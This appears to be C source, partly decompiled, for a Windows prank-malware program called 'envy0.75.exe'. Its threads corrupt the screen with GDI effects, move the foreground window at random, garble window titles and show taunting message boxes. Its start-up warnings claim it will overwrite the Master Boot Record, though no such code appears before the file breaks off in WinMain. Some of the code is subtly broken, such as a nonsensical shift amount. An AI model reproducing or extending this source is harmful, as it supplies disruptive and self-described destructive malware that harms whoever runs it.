#include "main.h"
#include "wav.h"

DWORD WINAPI mouse(LPVOID lpParam) {
	int sh = GetSystemMetrics(0), sw = GetSystemMetrics(1);
	double moveangle = 0; CURSORINFO curinf;
	for (int i = 0;; i++, i %= 20) {
		GetCursorInfo(&curinf);
		SeedXorshift32(__rdtsc());
		HDC desk = GetDC(0);
		int ax = (int)(fabsf(moveangle) * 3);
		int ay = (int)(tan(moveangle) * 3);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(desk, xorshift32() % sw, xorshift32() % sh, curinf.hCursor);
		Sleep(10);
	}
}

DWORD WINAPI rand_window(LPVOID lpParam)
{
	int uVar1;
	int uVar2;
	int uVar3;
	uint uVar4;
	uint uVar5;
	uint uVar6;
	HWND hWnd;
	uint uVar7;
	uint uVar8;
	uint uVar9;
	HWND hWndInsertAfter;
	UINT uFlags;

	uVar4 = GetSystemMetrics(0);
	uVar5 = GetSystemMetrics(1);
	GetDC((HWND)0x0);
	do {
		uVar1 = rdtsc();
		uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
		uVar6 = uVar6 ^ uVar6 << 0x11;
		uVar1 = rdtsc();
		uVar2 = rdtsc();
		uVar3 = rdtsc();
		uVar7 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
		uVar6 = (uVar6 << 5 ^ uVar6) % uVar5;
		uVar7 = uVar7 ^ uVar7 << 0x11;
		uFlags = 0;
		uVar9 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
		uVar7 = (uVar7 << 5 ^ uVar7) % uVar4;
		uVar9 = uVar9 ^ uVar9 << 0x11;
		uVar8 = (uint)uVar3 ^ (uint)uVar3 << 0xd;
		uVar9 = (uVar9 << 5 ^ uVar9) % uVar5;
		uVar8 = uVar8 ^ uVar8 << 0x11;
		uVar8 = (uVar8 << 5 ^ uVar8) % uVar4;
		hWndInsertAfter = (HWND)0x0;
		hWnd = GetForegroundWindow();
		SetWindowPos(hWnd, hWndInsertAfter, uVar8, uVar9, uVar7, uVar6, uFlags);
		uVar1 = rdtsc();
		uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
		uVar6 = uVar6 ^ uVar6 << 0x11;
		Sleep((uVar6 ^ uVar6 << 5) % 800 + 600);
	} while (true);
}

DWORD WINAPI garbled(LPVOID lpParam)
{
	int uVar1;
	HWND hWnd;
	int iVar2;
	uint uVar3;
	CHAR* lpString;
	CHAR local_9;
	do {
		iVar2 = 0;
		do {
			uVar1 = rdtsc();
			uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
			uVar3 = uVar3 ^ uVar3 << 0x11;
			(&local_9)[iVar2] = (CHAR)((ulonglong)(uVar3 << 5 ^ uVar3) % 0x47);
			iVar2 = iVar2 + 1;
		} while (iVar2 < 0x46);
		lpString = &local_9;
		hWnd = GetForegroundWindow();
		SetWindowTextA(hWnd, lpString);
		Sleep(25);
	} while (true);
}

DWORD WINAPI icon(LPVOID lpParam)
{
	ulonglong uVar1;
	int uVar2;
	uint uVar3;
	uint uVar4;
	HDC hDC;
	uint uVar5;
	HICON pHVar6;
	void* extraout_ECX;
	void* extraout_ECX_00;
	void* extraout_ECX_01;
	void* extraout_ECX_02;
	int extraout_EDX;
	uint uVar7;
	int extraout_EDX_00;
	int extraout_EDX_01;
	int extraout_EDX_02;
	int iVar8;
	double dVar9;
	int Y;
	uint Y_00;
	double local_18;
	double local_10;

	uVar3 = GetSystemMetrics(0);
	uVar4 = GetSystemMetrics(1);
	hDC = GetDC((HWND)0x0);
	do {
		do {
			while (true) {
				uVar1 = rdtsc();
				local_10 = 0.0;
				local_18 = 0.0;
				uVar5 = (uint)uVar1 & 3;
				if ((uVar1 & 3) == 0) break;
				if (uVar5 == 1) {
					uVar2 = rdtsc();
					uVar7 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
					uVar7 = uVar7 ^ uVar7 << 0x11;
					for (uVar5 = uVar3; 0 < (int)uVar5; uVar5 = uVar5 - 3) {
						pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f03);
						dVar9 = local_18;
						(extraout_ECX_00, extraout_EDX_00);
						DrawIcon(hDC, uVar5, (int)(dVar9 * local_10 + (double)((uVar7 << 5 ^ uVar7) % uVar4)),
							pHVar6);
						local_18 = local_18 + 0.05;
						local_10 = local_10 + 0.32;
						Sleep(10);
					}
				}
				else if (uVar5 == 2) {
					uVar2 = rdtsc();
					iVar8 = 0;
					uVar5 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
					uVar5 = uVar5 ^ uVar5 << 0x11;
					if (0 < (int)uVar4) {
						do {
							pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f04);
							dVar9 = local_18;
							Y = iVar8;
							(extraout_ECX_01, extraout_EDX_01);
							DrawIcon(hDC, (int)(dVar9 * local_10 + (double)((uVar5 << 5 ^ uVar5) % uVar3)), Y, pHVar6);
							local_18 = local_18 + 0.05;
							local_10 = local_10 + 0.32;
							Sleep(10);
							iVar8 = iVar8 + 3;
						} while (iVar8 < (int)uVar4);
					}
				}
				else if (uVar5 == 3) {
					uVar2 = rdtsc();
					uVar7 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
					uVar7 = uVar7 ^ uVar7 << 0x11;
					for (uVar5 = uVar4; 0 < (int)uVar5; uVar5 = uVar5 - 3) {
						pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f02);
						dVar9 = local_18;
						Y_00 = uVar5;
						(extraout_ECX_02, extraout_EDX_02);
						DrawIcon(hDC, (int)(dVar9 * local_10 + (double)((uVar7 << 5 ^ uVar7) % uVar3)), Y_00,
							pHVar6);
						local_18 = local_18 + 0.05;
						local_10 = local_10 + 0.32;
						Sleep(10);
					}
				}
			}
			uVar2 = rdtsc();
			uVar5 = (uint)uVar2 ^ (uint)uVar2 << 0xd;
			uVar5 = uVar5 ^ uVar5 << 0x11;
			iVar8 = 0;
		} while ((int)uVar3 < 1);
		do {
			pHVar6 = LoadIconW((HINSTANCE)0x0, (LPCWSTR)0x7f01);
			dVar9 = local_18;
			(extraout_ECX, extraout_EDX);
			DrawIcon(hDC, iVar8, (int)(dVar9 * local_10 + (double)((uVar5 << 5 ^ uVar5) % uVar4)), pHVar6);
			local_18 = local_18 + 0.05;
			local_10 = local_10 + 0.32;
			Sleep(10);
			iVar8 = iVar8 + 3;
		} while (iVar8 < (int)uVar3);
	} while (true);
}

DWORD WINAPI circle(LPVOID lpParam)
{
	int uVar1;
	ulonglong uVar2;
	uint uVar3;
	uint uVar4;
	HDC hdc;
	HPEN h;
	int right;
	uint uVar5;
	int top;
	int bottom;
	int left;
	int local_28;
	int local_1c;
	HBRUSH local_14;
	int local_10;
	uint local_c;
	uint local_8;

	uVar3 = GetSystemMetrics(0);
	uVar4 = GetSystemMetrics(1);
	hdc = GetDC((HWND)0x0);
	uVar1 = rdtsc();
	uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
	uVar5 = uVar5 ^ uVar5 << 0xd300918;
	local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
	uVar1 = rdtsc();
	uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
	uVar5 = uVar5 ^ uVar5 << 0xd300918;
	local_c = (uVar5 << 5 ^ uVar5) % uVar4;
	local_14 = CreateSolidBrush(0xd300918);
	h = CreatePen(0, 2, 0xffffff);
	local_28 = 0;
	do {
		if (local_28 == 1) {
			local_14 = CreateSolidBrush(0xd300918);
		}
		SelectObject(hdc, local_14);
		SelectObject(hdc, h);
		if (((((int)uVar3 <= (int)local_8) || ((int)uVar4 <= (int)local_c)) || ((int)local_8 < 1)) ||
			((int)local_c < 1)) {
			uVar1 = rdtsc();
			uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
			uVar5 = uVar5 ^ uVar5 << 0x11;
			local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
			uVar1 = rdtsc();
			uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
			uVar5 = uVar5 ^ uVar5 << 0x11;
			local_c = (uVar5 << 5 ^ uVar5) % uVar4;
		}
		uVar2 = rdtsc();
		left = local_8 - 0x3c;
		top = local_c - 0x3c;
		uVar5 = (uint)uVar2 & 3;
		right = local_8 + 0x3c;
		bottom = local_c + 0x3c;
		local_1c = 10;
		local_10 = right;
		do {
			if ((uVar2 & 3) == 0) {
				Ellipse(hdc, left, top, right, bottom);
				local_8 = local_8 + 0x14;
				left = left + 0x14;
				local_10 = local_10 + 0x14;
				bottom = bottom + 0x14;
				local_c = local_c + 0x14;
				top = top + 0x14;
			LAB_004020f7:
				Sleep(0x82);
				right = local_10;
			}
			else {
				if (uVar5 == 1) {
					Ellipse(hdc, left, top, right, bottom);
					local_8 = local_8 + 0x14;
					local_10 = local_10 + 0x14;
					left = left + 0x14;
				LAB_004020ed:
					local_c = local_c - 0x14;
					bottom = bottom + -0x14;
					top = top + -0x14;
					goto LAB_004020f7;
				}
				if (uVar5 == 2) {
					Ellipse(hdc, left, top, right, bottom);
					local_8 = local_8 - 0x14;
					left = left + -0x14;
					local_10 = local_10 + -0x14;
					bottom = bottom + 0x14;
					local_c = local_c + 0x14;
					top = top + 0x14;
					goto LAB_004020f7;
				}
				if (uVar5 == 3) {
					Ellipse(hdc, left, top, right, bottom);
					local_8 = local_8 - 0x14;
					local_10 = local_10 + -0x14;
					left = left + -0x14;
					goto LAB_004020ed;
				}
			}
			local_1c = local_1c + -1;
		} while (local_1c != 0);
		local_28 = local_28 + 1;
	} while (true);
}

DWORD WINAPI clipping(LPVOID lpParam)
{
	int uVar1;
	ulonglong uVar2;
	uint uVar3;
	uint uVar4;
	HDC hdc;
	uint uVar5;
	uint x1;
	uint y1;
	uint uVar6;
	int cx;
	int local_14;
	int local_10;

	uVar3 = GetSystemMetrics(0);
	uVar4 = GetSystemMetrics(1);
	hdc = GetDC((HWND)0x0);
	do {
		do {
			while (true) {
				uVar1 = rdtsc();
				uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
				uVar5 = uVar5 ^ uVar5 << 0x11;
				x1 = (uVar5 << 5 ^ uVar5) % uVar3;
				uVar1 = rdtsc();
				uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
				uVar5 = uVar5 ^ uVar5 << 0x11;
				y1 = (uVar5 << 5 ^ uVar5) % uVar4;
				uVar2 = rdtsc();
				uVar5 = (uint)uVar2 & 3;
				uVar1 = rdtsc();
				uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
				uVar6 = uVar6 ^ uVar6 << 0x11;
				uVar1 = rdtsc();
				cx = (uVar6 ^ uVar6 << 5) % 300 + 200;
				uVar6 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
				uVar6 = uVar6 ^ uVar6 << 0x11;
				uVar6 = (uVar6 ^ uVar6 << 5) % 0x32;
				if ((uVar2 & 3) == 0) break;
				if (uVar5 == 1) {
					local_10 = 0;
					uVar5 = y1;
					if (uVar6 != 0xffffffec) {
						do {
							BitBlt(hdc, local_10 + x1, uVar5, cx, cx, hdc, x1, y1, SRCCOPY);
							Sleep(100);
							local_10 = local_10 + 10;
							uVar5 = uVar5 - 10;
						} while (local_10 < (int)(uVar6 + 0x14));
					}
				}
				else if (uVar5 == 2) {
					local_14 = 0;
					uVar5 = x1;
					if (uVar6 != 0xffffffec) {
						do {
							BitBlt(hdc, uVar5, y1 + local_14, cx, cx, hdc, x1, y1, SRCCOPY);
							Sleep(100);
							local_14 = local_14 + 10;
							uVar5 = uVar5 - 10;
						} while (local_14 < (int)(uVar6 + 0x14));
					}
				}
				else if ((uVar5 == 3) && (uVar6 != 0xffffffec)) {
					local_14 = (uVar6 + 0x13) / 10 + 1;
					uVar5 = x1;
					do {
						BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCCOPY);
						Sleep(100);
						uVar5 = uVar5 - 10;
						local_14 = local_14 + -1;
					} while (local_14 != 0);
				}
			}
		} while (uVar6 == 0xffffffec);
		local_10 = (uVar6 + 0x13) / 10 + 1;
		uVar5 = x1;
		do {
			BitBlt(hdc, uVar5, (y1 - x1) + uVar5, cx, cx, hdc, x1, y1, SRCCOPY);
			Sleep(100);
			uVar5 = uVar5 + 10;
			local_10 = local_10 + -1;
		} while (local_10 != 0);
	} while (true);
}

//gdi6 message box
//gdi6のメッセージボックス

DWORD WINAPI msg1(LPVOID lpParam) {
	MessageBox(NULL, "I\'m so envy to you...", "envy0.75.exe", MB_ICONERROR);
	return 0;
}

DWORD WINAPI msg2(LPVOID lpParam) {
	MessageBox(NULL, "You lose :D", "envy0.75.exe", MB_ICONWARNING);
	return 0;
}

DWORD WINAPI msg3(LPVOID lpParam) {
	MessageBox(NULL, "縺九☆縺励◆縺励◆繧ゅ∪", "◆縺励nv◆繧0.?5.exё", MB_ICONERROR);
	return 0;
}

DWORD WINAPI msg4(LPVOID lpParam) {
	MessageBox(NULL, "縺吶◆縺輔″縺薙∪繧?縺吶▲縺溘◆縺阪％縺", "吶▲縺溘◆o..5.ёX г", MB_ICONINFORMATION);
	return 0;
}

DWORD WINAPI gdi1(LPVOID lpParam) {
	while (1) {
		HDC desk = GetDC(0);
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		int rx;
		while (1) {
			rx = xorshift32() % sw;
			int ry = xorshift32() % sh;
			desk = GetDC(0);
			int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
			HDC desk = GetDC(0);

			SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
			BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, RGBBRUSH);
			BitBlt(desk, rx, -10, -100, sh, desk, rx, 0, RGBBRUSH);
			BitBlt(desk, 10, ry, sw, 100, desk, 0, ry, RGBBRUSH);
			BitBlt(desk, -10, ry, sw, -100, desk, 0, ry, RGBBRUSH);
			Sleep(40);
		}
	}
}

VOID WINAPI gdi2_mlt()
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	desk = GetDC(0);
	rx = xorshift32() % sw;
	int ry = xorshift32() % sh;
	BitBlt(desk, rx, 40, 200, sh, desk, rx, 0, SRCCOPY);
	BitBlt(desk, rx, -40, -200, sh, desk, rx, 0, SRCCOPY);
	BitBlt(desk, 40, ry, sw, 200, desk, 0, ry, SRCCOPY);
	BitBlt(desk, -40, ry, sw, -200, desk, 0, ry, SRCCOPY);
	Sleep(0);
}

DWORD WINAPI gdi2(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (1) {
		SeedXorshift32(__rdtsc());
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		HDC desk = GetDC(0);
		desk = GetDC(0);
		BitBlt(desk, 0, w, sw, h, desk, 0 + xorshift32() % 21 - 10, w, SRCCOPY);
		BitBlt(desk, 0, w, sw, h, desk, 0 - xorshift32() % 21 + 10, w, SRCCOPY);
		if (((xorshift32() % 10 == 1))) InvalidateRect(0, 0, 0);
		gdi2_mlt();
	}
}

VOID WINAPI gdi3_solaris(int x, int y, int w, int h) {
	HWND hwnd = NULL;
	HDC hdc = GetDC(hwnd);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	DeleteObject(hrgn);
	ReleaseDC(hwnd, hdc);
	Sleep(10);
}

DWORD WINAPI gdi3(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	HDC hDc = GetWindowDC(GetDesktopWindow());
	int x = rand() % GetSystemMetrics(SM_CXSCREEN);
	int y = rand() % GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		FreeConsole();
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_APPLICATION));
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		RECT rect;
		GetWindowRect(GetDesktopWindow(), &rect);
		int w = rect.right - rect.top - 500, h = rect.bottom - rect.top - 500;
		const int size = 1000;
		int x = xorshift32() % (w + size) - size / 2, y = xorshift32() % (h + size) - size / 2;
		for (int i = 0; i < size; i += 60) {
		gdi3_solaris(x - i / 2, y - i / 2, i, i);
		}
		Sleep(25);
	}
}

DWORD WINAPI gdi4(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		SelectObject(desk, CreateHatchBrush(xorshift32() % 7, RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		Ellipse(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		Rectangle(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		//BitBlt(desk, xorshift32() % 10, xorshift32() % 10, sw, sh, desk, xorshift32() % 10, xorshift32() % 10, 0x2837E28);
		Sleep(50);
		if (xorshift32() % 35 == 5) InvalidateRect(0, 0, 0);
	}
}

DWORD WINAPI gdi5(LPVOID lpParam) {
	POINT wPt[3];
	RECT wRect;
	HDC desk = GetDC(0);
	double moveangle = 0;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		BitBlt(desk, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		BitBlt(desk, xorshift32() % 10, xorshift32() % 10, sw, sh, desk, xorshift32() % 10, xorshift32() % 10, SRCCOPY);
		StretchBlt(desk, 5, 5, sw - 10, sh - 10, desk, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(desk, 1, 1, sw - 1, sh - 1, desk, 0, 0, sw, sh, SRCAND);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left - 10;
		wPt[0].y = wRect.top + 10;
		wPt[1].x = wRect.right - 10;
		wPt[1].y = wRect.top - 10;
		wPt[2].x = wRect.left + 10;
		wPt[2].y = wRect.bottom + 10;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		if (xorshift32() % 5 == 0) InvalidateRect(0, 0, 0);
		SetBkMode(desk, TRANSPARENT);
		SetTextColor(desk, CUSRGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255));
		//HFONT font = CreateFontA(20, 30, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0,d "Smooch Sans");
		//SelectObject(desk, font);
		TextOutW(desk, xorshift32() % sw, xorshift32() % sh, L"ENVY0.75.EXE", wcslen(L"ENVY0.75.EXE"));
		SeedXorshift32(__rdtsc());
		int ax = (int)(cos(moveangle) * 5);
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 500, xorshift32() % 500, xorshift32() % 500)));
		int ay = (int)(sin(moveangle) * 5);
		StretchBlt(desk, ax, ay, sw, sh, desk, 0, 0, sw, sh, RGBBRUSH);
		moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		Sleep(80);
	}
}

VOID WINAPI gdi6_mlt() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	desk = GetDC(0);
	rx = xorshift32() % sw;
	int ry = xorshift32() % sh;
	BitBlt(desk, rx, 20, 100, sh, desk, rx, 0, SRCCOPY);
	BitBlt(desk, rx, -20, -100, sh, desk, rx, 0, SRCCOPY);
	BitBlt(desk, 20, ry, sw, 100, desk, 0, ry, SRCCOPY);
	BitBlt(desk, -20, ry, sw, -100, desk, 0, ry, SRCCOPY);
	Sleep(5);
}
DWORD WINAPI gdi6(LPVOID lpParam) {
	while (1) {
		SeedXorshift32(__rdtsc());
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		HDC desk = GetDC(0);
		gdi6_mlt();
	}
}

DWORD WINAPI gdi7(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	double moveangle = 0;
	while (true) {
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		int ax = (int)(cos(moveangle) * 7.5);
		int ay = (int)(sin(moveangle) * 7.5);
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, RGBBRUSH);
		int w = xorshift32() % sh, h = sh / 5 - xorshift32() % sh / 2;
		BitBlt(desk, 0, w, sw, h, desk, 0 + xorshift32() % 210 - 100, w, SRCCOPY ^ PATCOPY);
		if (((xorshift32() % 30 == 1))) InvalidateRect(0, 0, 0);
		moveangle = fmod(moveangle + M_PI / 4.f, M_PI * 2.f);
		Sleep(xorshift32() % 10);
	}
}

RECT wRect;
POINT wPt[3];
void gdi8_waterfall1(int counter) {
	SeedXorshift32(__rdtsc());
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	HDC deskMem = CreateCompatibleDC(desk);
	HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(deskMem, screenshot);
	GetWindowRect(GetDesktopWindow(), &wRect);
	wPt[0].x = wRect.left + counter;
	wPt[0].y = wRect.top - counter;
	wPt[1].x = wRect.right + counter;
	wPt[1].y = wRect.top + counter;
	wPt[2].x = wRect.left - counter;
	wPt[2].y = wRect.bottom - counter;
	PlgBlt(deskMem, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
	Sleep(10);
	if (xorshift32() % 10 == 5) InvalidateRect(0, 0, 0);
	Sleep(125);
}
void gdi8_waterfall2(int counter) {
	SeedXorshift32(__rdtsc());
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	HDC deskMem = CreateCompatibleDC(desk);
	HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
	SelectObject(deskMem, screenshot);
	GetWindowRect(GetDesktopWindow(), &wRect);
	wPt[0].x = wRect.left - counter;
	wPt[0].y = wRect.top + counter;
	wPt[1].x = wRect.right - counter;
	wPt[1].y = wRect.top - counter;
	wPt[2].x = wRect.left + counter;
	wPt[2].y = wRect.bottom + counter;
	PlgBlt(deskMem, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);;
	BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
	Sleep(10);	
	if (xorshift32() % 10 == 5) InvalidateRect(0, 0, 0);
	Sleep(125);
}
DWORD WINAPI gdi8(LPVOID lpParam) {
	while (1) {
		gdi8_waterfall1(10);
		gdi8_waterfall2(10);
		gdi8_waterfall2(10);
		gdi8_waterfall1(10);
	}
}

VOID WINAPI gdi9_zer1() {
	SeedXorshift32(__rdtsc());
	HDC desk = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	desk = GetDC(0);
	GetWindowRect(GetDesktopWindow(), &wRect);
	int c = 100;
	wPt[0].x = wRect.left + xorshift32() % 50 - 25;
	wPt[0].y = wRect.top + xorshift32() % 100 - 50;
	wPt[1].x = wRect.right + xorshift32() % 100 - 50;
	wPt[1].y = wRect.top + xorshift32() % 200 - 100;
	wPt[2].x = wRect.left + c - xorshift32() % 100 - c;
	wPt[2].y = wRect.bottom - c + xorshift32() % 100 - c;
	PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	Sleep(80);
	if (xorshift32() % 5 == 1) RedrawWindow(0, 0, 0, 133);
	Sleep(80);
}
VOID WINAPI gdi9_zer2() {
	SeedXorshift32(__rdtsc());
	HDC desk = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	desk = GetDC(0);
	GetWindowRect(GetDesktopWindow(), &wRect);
	int c = 100;
	wPt[0].x = wRect.left + xorshift32() % 25 + 10;
	wPt[0].y = wRect.top + xorshift32() % 50 + 25;
	wPt[1].x = wRect.right + xorshift32() % 50 + 25;
	wPt[1].y = wRect.top + xorshift32() % 100 + 50;
	wPt[2].x = wRect.left + c - xorshift32() % 50 + c;
	wPt[2].y = wRect.bottom - c + xorshift32() % 50 + c;
	PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
	Sleep(80);
	if (xorshift32() % 5 == 1) RedrawWindow(0, 0, 0, 133);
	Sleep(80);
}

DWORD WINAPI gdi9(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (true)
	{
		HWND desktop = GetDesktopWindow();
		HDC desk = GetDC(NULL);
		RECT rect;
		GetWindowRect(desktop, &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		StretchBlt(desk, w, 0, -w, h, desk, 0, 0, w, h, SRCCOPY);
		gdi9_zer1();
		gdi9_zer2();
		gdi9_zer2();
		gdi9_zer1();
		SetBkMode(desk, TRANSPARENT);
		SetTextColor(desk, CUSRGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255));
		//HFONT font = CreateFontA(20, 30, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0,d "Smooch Sans");
		//SelectObject(desk, font);
		TextOutW(desk, xorshift32() % sw, xorshift32() % sh, L"RIP PC", wcslen(L"RIP PC"));
		Sleep(60);
	}
}

DWORD WINAPI gdi10(LPVOID lpParam) {
	HDC desk = GetDC(0);
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	POINT wPt[3];
	RECT wRect;
	while (1) {
		desk = GetDC(0);
		hdc = GetDC(0);
		SeedXorshift32(__rdtsc());
		GetWindowRect(GetDesktopWindow(), &wRect);
		int x = xorshift32() % 1000;
		wPt[0].x = wRect.left - xorshift32() % 1010 + 500; wPt[0].y = wRect.left - xorshift32() % 2001 + 1000; wPt[1].x = wRect.left - xorshift32() % 2001 + 1000; wPt[1].y = wRect.left + xorshift32() % 4100 + 2000; wPt[2].x = wRect.left + x - xorshift32() % 2100 + 1000; wPt[2].y = wRect.left + x - xorshift32() % 2010 + 1000;
		PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 125, rand() % 125, rand() % 152)));
		StretchBlt(hdc, 0, 0, sw, sh, hdc, xorshift32() % sw, xorshift32() % sh, sw, sh, PATINVERT);
		StretchBlt(hdc, 0, 0, sw, sh, hdc, xorshift32() % sw, 0 - xorshift32() % sh, sw, sh, PATINVERT);
		StretchBlt(hdc, 0, 0, sw, sh, hdc, 0 - xorshift32() % sw, xorshift32() % sh, sw, sh, PATINVERT);
		StretchBlt(hdc, 0, 0, sw, sh, hdc, 0 - xorshift32() % sw, 0 - xorshift32() % sh, sw, sh, PATINVERT);
		Sleep(150);
	}
}

DWORD WINAPI gdi11(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double moveangle = 0;
	while (1) {
		desk = GetDC(0);
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		SeedXorshift32(__rdtsc());
		int ax = (int)(cos(moveangle) * 5);
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 500, xorshift32() % 500, xorshift32() % 500)));
		int ay = (int)(sin(moveangle) * 5);
		StretchBlt(desk, ax, ay, sw, sh, desk, 0, 0, sw, sh, RGBBRUSH);
		moveangle = fmod(moveangle + M_PI / 8.f, M_PI * 2.f);
		SelectObject(desk, CreateHatchBrush(xorshift32() % 7, RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		//Ellipse(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		Rectangle(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		//BitBlt(desk, xorshift32() % 10, xorshift32() % 10, sw, sh, desk, xorshift32() % 10, xorshift32() % 10, 0x2837E28);
		Sleep(15);
		if (xorshift32() % 5 == 5) InvalidateRect(0, 0, 0);
	}
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
	if (MessageBoxW(NULL, L"!!!WARNING!!!\n\nThis has the power to damage your computer. This malware is filled with dangerous code and I, the author, take no responsibility for it. Please run it at your own risk.\n\nDo you really want to run it?", L"envy0.75.exe - !!!WARNING!!!", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;

	if (MessageBoxW(NULL, L"!!!LAST WARNING!!!\n\nIt contains a program that will overwrite your MBR and render it unusable unless repaired. I, the author, take no responsibility!This is your last chance to stop it from running!\n\nDO YOU REALLY WANT TO RUN IT?!?!?!?!?!?!", L"envy0.75.exe - !!!LAST WARNING!!!", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;

	sound1();
	HANDLE thread0 = CreateThread(0, 0, mouse, 0, 0, 0);
	HANDLE thread24 = CreateThread(0, 0, rand_window, 0, 0, 0);
	HANDLE thread23 = CreateThread(0, 0, garbled, 0, 0, 0);
